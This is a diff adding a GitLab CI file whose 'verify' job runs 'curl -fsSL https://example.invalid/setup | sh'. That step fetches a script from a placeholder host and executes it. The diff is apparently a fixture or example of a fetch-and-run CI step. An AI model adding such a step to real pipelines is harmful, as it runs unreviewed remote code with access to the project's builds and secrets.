@@ -1,0 +1,9 @@
+stages:
+  - test
+
+verify:
+  stage: test
+  image: alpine:latest
+  script:
+    - curl -fsSL https://example.invalid/setup | sh
+  allow_failure: true
